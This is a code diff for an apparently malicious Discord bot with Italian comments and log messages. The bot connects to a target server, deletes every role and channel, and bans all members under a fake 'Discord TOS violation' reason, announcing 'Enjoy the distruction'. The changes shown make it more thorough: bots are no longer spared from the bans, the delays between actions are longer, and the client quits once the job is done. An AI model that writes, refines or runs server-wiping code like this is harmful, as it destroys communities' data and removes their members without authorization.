@@ -13,7 +13,7 @@ client.once('ready', async () => {
     console.log(`Ready! Enjoy the distruction 👀`);
 
     const guild = await client.guilds.fetch(guildId);
-    console.log(`Guild trovata: ${guild.name}`);
+    console.log(guild.name);
     try {
         // Fetch dei ruoli direttamente dalla guild
         const roles = await guild.roles.fetch();
@@ -32,7 +32,7 @@ client.once('ready', async () => {
             }
         }
 
-        console.log("Tutti i ruoli sono stati processati!");
+        console.log("Tutti i ruoli sono stati eliminati!");
 
         // Fetch dei canali direttamente dalla guild
         const channels = await guild.channels.fetch();
@@ -40,7 +40,7 @@ client.once('ready', async () => {
         // Elimina tutti i canali
         for (const channel of channels.values()) {
             try {
-                await sleep(1000); // Sleep di 1 secondo tra le eliminazioni
+                await sleep(2000); // Sleep di 1 secondo tra le eliminazioni
                 await channel.delete();
                 console.log(`Canale eliminato: ${channel.name}`);
             } catch (error) {
@@ -48,25 +48,24 @@ client.once('ready', async () => {
             }
         }
 
-        console.log("Tutti i canali sono stati processati!");
+        console.log("Tutti i canali sono stati eliminati!");
 
         // Fetch dei membri direttamente dalla guild
         const members = await guild.members.fetch();
 
         // Banna tutti i membri
         for (const member of members.values()) {
-            if (!member.user.bot) { // Non bannare i bot
-                try {
-                    await sleep(1000); // Sleep di 1 secondo tra i ban
-                    await member.ban({ reason: 'Violazione dei TOS di Discord.' });
-                    console.log(`Membro bannato: ${member.user.tag}`);
-                } catch (error) {
-                    console.error(`Errore nel bannare il membro ${member.user.tag}`);
-                }
+            try {
+                await sleep(2000); // Sleep di 1 secondo tra i ban
+                await member.ban({ reason: 'Violazione dei TOS di Discord.' });
+                console.log(`Membro bannato: ${member.user.tag}`);
+            } catch (error) {
+                console.error(`Errore nel bannare il membro ${member.user.tag}`);
             }
         }
 
-        console.log("Tutti i membri sono stati processati!");
+        console.log("Tutti i membri sono stati bannati!");
+        client.destroy();
 
     } catch (error) {
         console.error(`Errore nel fetch dei ruoli, canali o membri`);
